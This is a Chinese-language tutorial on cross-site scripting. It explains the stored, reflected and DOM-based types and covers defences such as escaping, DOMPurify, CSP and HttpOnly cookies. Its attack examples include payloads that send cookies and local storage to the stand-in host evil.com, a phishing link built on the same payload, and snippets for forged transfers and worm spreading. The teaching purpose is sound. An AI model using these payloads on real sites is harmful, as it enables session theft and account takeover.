---
title: XSS 攻击与防护
icon: mdi:web
category:
  - 网络安全
tag:
  - XSS
  - 安全
  - 跨站脚本
  - 前端安全
---

# XSS 攻击与防护

## 1. 什么是 XSS 攻击

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是一种常见的前端安全漏洞，指攻击者将恶意 JavaScript 代码注入到网页中，当用户访问该网页时，恶意代码会被浏览器执行，从而：

- 🔓 **窃取用户数据**（Cookie、Token、敏感信息）
- 🎭 **伪造用户操作**（转账、发布内容、修改密码）
- 💥 **破坏页面功能**（篡改页面、删除内容）

### 1.1 攻击原理

```
攻击者注入恶意代码
    ↓
网页包含恶意代码
    ↓
用户访问网页
    ↓
浏览器执行恶意代码
    ↓
用户数据被窃取/操作被伪造
```

### 1.2 简单示例

**假设有一个评论功能：**

```javascript
// 后端返回的评论内容
const comment = '<script>alert(document.cookie)</script>';

// 前端直接渲染（危险！）
document.getElementById('comment').innerHTML = comment;
```

**结果：**
- 浏览器会执行 `<script>` 标签中的代码
- 弹出当前页面的所有 Cookie
- 攻击者可以窃取用户的登录凭证

## 2. 常见的攻击方式

根据攻击代码的注入和执行场景，主要分为三类：

### 2.1 存储型 XSS（Persistent XSS，最危险）

#### 攻击流程

```
1. 攻击者提交恶意代码到服务器
   ↓
2. 服务器存储恶意代码（数据库）
   ↓
3. 其他用户访问包含该内容的页面
   ↓
4. 服务器返回恶意代码
   ↓
5. 浏览器执行恶意代码
```

#### 典型场景

- 📝 评论区
- 💬 论坛帖子
- 👤 用户个人简介
- 📋 留言板

#### 攻击示例

```javascript
// 攻击者在评论框输入
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

// 服务器存储到数据库
INSERT INTO comments (content) VALUES ('<script>fetch(...)</script>')

// 其他用户访问评论页面
// 后端返回
{ "content": "<script>fetch(...)</script>" }

// 前端渲染（所有访问此页面的用户都会中招）
commentDiv.innerHTML = data.content;
```

#### 危害特点

- ⚠️ **恶意代码长期存在**
- ⚠️ **所有访问该页面的用户都会受影响**
- ⚠️ **可能批量窃取用户数据**

### 2.2 反射型 XSS（Reflected XSS，最常见）

#### 攻击流程

```
1. 攻击者构造含恶意代码的 URL
   ↓
2. 诱导用户点击该 URL
   ↓
3. 服务器将 URL 中的恶意代码"反射"回页面
   ↓
4. 浏览器执行代码
```

#### 典型场景

- 🔍 搜索框
- 📄 URL 参数传值（分页、详情页 ID）
- ❌ 登录失败提示

#### 攻击示例

```javascript
// 攻击者构造恶意 URL
https://example.com/search?keyword=<script>alert(document.cookie)</script>

// 后端代码（危险！）
app.get('/search', (req, res) => {
  const keyword = req.query.keyword;
  // 直接将用户输入返回到页面
  res.send(`<h1>搜索结果：${keyword}</h1>`);
});

// 页面渲染后
<h1>搜索结果：<script>alert(document.cookie)</script></h1>

// 浏览器会执行 script 标签中的代码
```

#### 真实案例

**案例：钓鱼链接**

```
攻击者发送邮件：
"您的账号出现异常，请点击链接验证：
https://bank.com/verify?msg=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"

用户点击后：
1. 恶意脚本执行
2. Cookie 被发送到攻击者服务器
3. 攻击者使用 Cookie 登录用户账号
```

#### 危害特点

- ⚠️ **恶意代码不存储在服务器**
- ⚠️ **需用户主动点击恶意链接**
- ⚠️ **危害范围相对可控**

### 2.3 DOM 型 XSS（DOM-Based XSS，前端专属）

#### 攻击流程

```
1. 攻击者构造含恶意代码的 URL
   ↓
2. 用户访问 URL
   ↓
3. 前端 JS 读取 URL 中的恶意代码
   ↓
4. 前端直接用 innerHTML/eval 执行
```

#### 典型场景

- 📌 前端通过 URL 参数动态渲染内容
- 🔧 使用 `eval()` 解析用户输入
- 🎨 使用 `innerHTML` 直接插入内容

#### 攻击示例

```javascript
// 危险的前端代码
// URL: https://example.com?name=<img src=x onerror=alert(1)>

// 读取 URL 参数
const params = new URLSearchParams(window.location.search);
const name = params.get('name');

// 直接插入 DOM（危险！）
document.getElementById('welcome').innerHTML = `欢迎，${name}`;

// 渲染结果
<div id="welcome">欢迎，<img src=x onerror=alert(1)></div>

// 图片加载失败，触发 onerror 事件，执行 alert(1)
```

#### 更多危险 API

```javascript
// 1. eval() - 执行字符串代码
const userInput = "alert('XSS')";
eval(userInput); // 危险！

// 2. Function 构造器
const userInput = "alert('XSS')";
new Function(userInput)(); // 危险！

// 3. setTimeout/setInterval 字符串参数
setTimeout("alert('XSS')", 1000); // 危险！

// 4. innerHTML
element.innerHTML = userInput; // 危险！

// 5. document.write
document.write(userInput); // 危险！
```

#### 危害特点

- ⚠️ **恶意代码全程在前端处理**
- ⚠️ **不经过服务器**
- ⚠️ **本质是前端代码逻辑漏洞**

## 3. XSS 的主要危害

### 3.1 窃取敏感数据

```javascript
// 窃取 Cookie（含登录 Token、Session ID）
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      localStorage: localStorage,
      sessionStorage: sessionStorage
    })
  });
</script>
```

**后果：**
- 攻击者可以冒充用户身份登录
- 获取用户的权限数据
- 访问用户的私密信息

### 3.2 伪造用户操作

```javascript
// 自动点击按钮
<script>
  document.querySelector('.transfer-btn').click();
</script>

// 伪造请求
<script>
  fetch('/api/transfer', {
    method: 'POST',
    body: JSON.stringify({
      to: 'attacker',
      amount: 10000
    })
  });
</script>
```

**后果：**
- 未经授权的转账
- 自动发布垃圾内容
- 修改用户密码和资料

### 3.3 破坏页面功能

```javascript
// 覆盖页面内容
<script>
  document.body.innerHTML = '<h1>页面已被攻击</h1>';
</script>

// 删除关键元素
<script>
  document.querySelector('.login-form').remove();
</script>
```

**后果：**
- 页面无法正常使用
- 影响用户体验
- 损害网站声誉

### 3.4 传播恶意内容

```javascript
// 自动发送恶意链接给好友
<script>
  const friends = getUserFriends();
  friends.forEach(friend => {
    sendMessage(friend.id, '快来看这个链接：https://evil.com/xss');
  });
</script>
```

**后果：**
- 扩大攻击范围
- 形成蠕虫式传播
- 影响更多用户

## 4. 如何防护 XSS 攻击

### 4.1 输入转义（核心防护）

**将不可信数据中的特殊字符转义**，确保数据仅作为文本展示，而非代码执行。

#### 需要转义的特殊字符

| 字符 | 转义后 | 说明 |
|------|--------|------|
| `<` | `&lt;` | HTML 标签开始 |
| `>` | `&gt;` | HTML 标签结束 |
| `"` | `&quot;` | 属性值引号 |
| `'` | `&#x27;` | 属性值引号 |
| `&` | `&amp;` | HTML 实体 |
| `/` | `&#x2F;` | 闭合标签 |

#### 方式 1：使用成熟库（最可靠，推荐）

```javascript
// 安装 DOMPurify
// npm install dompurify

import DOMPurify from 'dompurify';

const untrustedData = '<script>alert("XSS")</script><img src=x onerror=alert(1)>';

// 清理恶意代码
const safeData = DOMPurify.sanitize(untrustedData);

console.log(safeData);
// 输出：空字符串（所有危险标签被移除）

// 安全渲染
document.getElementById('content').innerHTML = safeData;
```

**使用 validator.js 转义**

```javascript
import validator from 'validator';

const untrustedData = '<script>alert("XSS&hack")</script>';

// 转义特殊字符
const safeData = validator.escape(untrustedData);

console.log(safeData);
// 输出：&lt;script&gt;alert(&quot;XSS&amp;hack&quot;)&lt;/script&gt;

// 渲染到页面（浏览器会显示原始字符，不会执行脚本）
document.getElementById('content').textContent = safeData;
```

#### 方式 2：手动实现转义函数（适合简单场景）

```javascript
function escapeHtml(str) {
  const map = {
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '&': '&amp;',
    '/': '&#x2F;'
  };
  
  return str.replace(/[<>"'&\/]/g, char => map[char]);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeInput = escapeHtml(userInput);

console.log(safeInput);
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// 安全渲染
document.getElementById('content').textContent = safeInput;
```

### 4.2 正确使用 DOM API

#### ❌ 危险的做法

```javascript
// 1. 使用 innerHTML（危险）
element.innerHTML = userInput;

// 2. 使用 document.write（危险）
document.write(userInput);

// 3. 使用 eval（危险）
eval(userInput);
```

#### ✅ 安全的做法

```javascript
// 1. 使用 textContent（安全）
element.textContent = userInput; // 仅插入文本，不解析 HTML

// 2. 使用 createTextNode（安全）
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

// 3. 使用 setAttribute（部分安全）
element.setAttribute('data-value', userInput);
// 注意：不要用于 href、src 等可执行属性
```

#### 对比示例

```javascript
const userInput = '<img src=x onerror=alert(1)>';

// 危险方式
div1.innerHTML = userInput;
// 结果：执行了 alert(1)

// 安全方式
div2.textContent = userInput;
// 结果：显示 "<img src=x onerror=alert(1)>" 文本
```

### 4.3 Content Security Policy (CSP)

**CSP** 是一种额外的安全层，通过 HTTP 头部或 meta 标签限制浏览器可以执行的资源。

#### 设置 CSP

**方式 1：HTTP 响应头（推荐）**

```javascript
// Node.js + Express
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

**方式 2：HTML meta 标签**

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com">
```

#### CSP 策略说明

```
default-src 'self'              // 默认只允许同源资源
script-src 'self' https://cdn.com  // 脚本只能来自同源和指定CDN
style-src 'self' 'unsafe-inline'   // 样式允许内联（不推荐）
img-src *                       // 图片允许任何来源
object-src 'none'               // 禁止 <object>、<embed>
```

#### CSP 防护效果

```javascript
// 即使有 XSS 漏洞，恶意脚本也无法执行

// 内联脚本会被阻止
<script>alert('XSS')</script>  // ❌ 被 CSP 阻止

// 外部恶意脚本会被阻止
<script src="https://evil.com/xss.js"></script>  // ❌ 被 CSP 阻止

// 只有白名单中的脚本可以执行
<script src="https://trusted-cdn.com/app.js"></script>  // ✅ 允许
```

### 4.4 HTTP-only Cookie

**防止 JavaScript 访问 Cookie**，即使发生 XSS 攻击，攻击者也无法窃取 Cookie。

#### 设置 HTTP-only Cookie

```javascript
// Node.js + Express
res.cookie('token', 'user-token-value', {
  httpOnly: true,    // 禁止 JavaScript 访问
  secure: true,      // 仅 HTTPS 传输
  sameSite: 'strict' // 防止 CSRF 攻击
});
```

#### 效果对比

```javascript
// 没有 HTTP-only 标志
document.cookie; // 可以读取到 token

// 有 HTTP-only 标志
document.cookie; // 无法读取到 token（XSS 无法窃取）
```

### 4.5 输入验证（纵深防御）

**在服务器端验证用户输入**，拒绝可疑内容。

```javascript
// Node.js 示例
app.post('/comment', (req, res) => {
  const { content } = req.body;
  
  // 1. 检查是否包含 <script> 标签
  if (/<script/i.test(content)) {
    return res.status(400).json({ error: '内容包含非法字符' });
  }
  
  // 2. 检查是否包含 javascript: 协议
  if (/javascript:/i.test(content)) {
    return res.status(400).json({ error: '内容包含非法字符' });
  }
  
  // 3. 检查是否包含事件处理器
  if (/on\w+\s*=/i.test(content)) {
    return res.status(400).json({ error: '内容包含非法字符' });
  }
  
  // 4. 长度限制
  if (content.length > 1000) {
    return res.status(400).json({ error: '内容过长' });
  }
  
  // 5. 转义后存储
  const safeContent = escapeHtml(content);
  await saveComment(safeContent);
  
  res.json({ success: true });
});
```

### 4.6 前端框架的自动防护

现代前端框架默认提供 XSS 防护。

#### React

```jsx
// React 默认转义
function App() {
  const userInput = '<script>alert("XSS")</script>';
  
  // 安全：React 会自动转义
  return <div>{userInput}</div>;
  // 渲染为：<div>&lt;script&gt;alert("XSS")&lt;/script&gt;</div>
}

// 危险：使用 dangerouslySetInnerHTML
function DangerousApp() {
  const userInput = '<script>alert("XSS")</script>';
  
  // 危险：不会转义
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // 会执行脚本！
}
```

#### Vue

```vue
<template>
  <!-- 安全：Vue 会自动转义 -->
  <div>{{ userInput }}</div>
  
  <!-- 危险：v-html 不会转义 -->
  <div v-html="userInput"></div>
</template>

<script>
export default {
  data() {
    return {
      userInput: '<script>alert("XSS")</script>'
    }
  }
}
</script>
```

## 5. 完整防护方案

### 5.1 前端防护清单

```javascript
// 1. 使用安全的 DOM API
element.textContent = userInput;  // ✅
element.innerHTML = userInput;    // ❌

// 2. 转义不可信数据
import DOMPurify from 'dompurify';
const safeData = DOMPurify.sanitize(userInput);

// 3. 避免危险 API
eval(userInput);                  // ❌
setTimeout(userInput, 1000);      // ❌

// 4. 使用框架的安全特性
<div>{userInput}</div>            // ✅ React 自动转义
<div dangerouslySetInnerHTML />   // ❌ 避免使用

// 5. 设置 CSP
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 5.2 后端防护清单

```javascript
// 1. 输入验证
if (/<script/i.test(input)) {
  return res.status(400).json({ error: '非法输入' });
}

// 2. 输出转义
const safeOutput = escapeHtml(input);

// 3. HTTP-only Cookie
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// 4. 设置 CSP 响应头
res.setHeader('Content-Security-Policy', "default-src 'self'");

// 5. X-XSS-Protection 响应头
res.setHeader('X-XSS-Protection', '1; mode=block');
```

## 6. 实战案例

### 6.1 安全的评论功能

```javascript
// 前端 - 提交评论
async function submitComment(content) {
  // 前端简单验证
  if (content.length > 500) {
    alert('评论过长');
    return;
  }
  
  const response = await fetch('/api/comment', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content })
  });
  
  if (response.ok) {
    loadComments();
  }
}

// 前端 - 显示评论（安全渲染）
import DOMPurify from 'dompurify';

function renderComments(comments) {
  const container = document.getElementById('comments');
  
  comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';
    
    // 方式1：使用 textContent（最安全）
    div.textContent = comment.content;
    
    // 方式2：如果需要富文本，使用 DOMPurify
    // const safeContent = DOMPurify.sanitize(comment.content);
    // div.innerHTML = safeContent;
    
    container.appendChild(div);
  });
}

// 后端 - 处理评论
app.post('/api/comment', (req, res) => {
  const { content } = req.body;
  
  // 1. 验证长度
  if (!content || content.length > 500) {
    return res.status(400).json({ error: '评论长度不合法' });
  }
  
  // 2. 检查危险字符
  if (/<script|javascript:|on\w+=/i.test(content)) {
    return res.status(400).json({ error: '评论包含非法内容' });
  }
  
  // 3. 转义后存储
  const safeContent = escapeHtml(content);
  
  // 4. 保存到数据库
  db.comments.insert({
    content: safeContent,
    userId: req.user.id,
    createdAt: new Date()
  });
  
  res.json({ success: true });
});
```

### 6.2 安全的搜索功能

```javascript
// 前端 - 显示搜索结果
function displaySearchResults(keyword, results) {
  const container = document.getElementById('results');
  
  // 安全显示搜索关键词
  const keywordDiv = document.createElement('div');
  keywordDiv.textContent = `搜索关键词：${keyword}`;
  container.appendChild(keywordDiv);
  
  // 显示结果
  results.forEach(item => {
    const div = document.createElement('div');
    div.textContent = item.title;
    container.appendChild(div);
  });
}

// 后端 - 搜索接口
app.get('/api/search', (req, res) => {
  let { keyword } = req.query;
  
  // 1. 转义关键词
  keyword = escapeHtml(keyword);
  
  // 2. 限制长度
  if (keyword.length > 50) {
    keyword = keyword.substring(0, 50);
  }
  
  // 3. 执行搜索
  const results = searchDatabase(keyword);
  
  res.json({ keyword, results });
});
```

## 7. 常见问题

### Q1：是否需要对所有用户输入都进行转义？

**答：是的。** 永远不要信任用户输入，包括：
- 表单输入
- URL 参数
- Cookie
- LocalStorage
- 第三方 API 返回的数据

### Q2：前端转义 vs 后端转义，哪个更重要？

**答：都重要，建议双重防护。**
- **后端转义：** 防止恶意数据存入数据库
- **前端转义：** 防止 DOM 型 XSS
- **最佳实践：** 后端存储转义后的数据，前端使用安全 API 渲染

### Q3：使用了 HTTPS 就能防止 XSS 吗？

**答：不能。** HTTPS 只能防止中间人攻击，无法防止 XSS。XSS 是代码注入漏洞，与传输层加密无关。

### Q4：CSP 会影响正常的内联脚本吗？

**答：会。** CSP 默认会阻止所有内联脚本。如果需要使用内联脚本，可以：
1. 将脚本移到外部文件
2. 使用 nonce 或 hash 白名单
3. 设置 `'unsafe-inline'`（不推荐）

---

> 💡 **核心要点：** XSS 防护的核心是**不信任任何用户输入**，对所有不可信数据进行转义或过滤，使用安全的 API，并配合 CSP、HTTP-only Cookie 等多层防护。
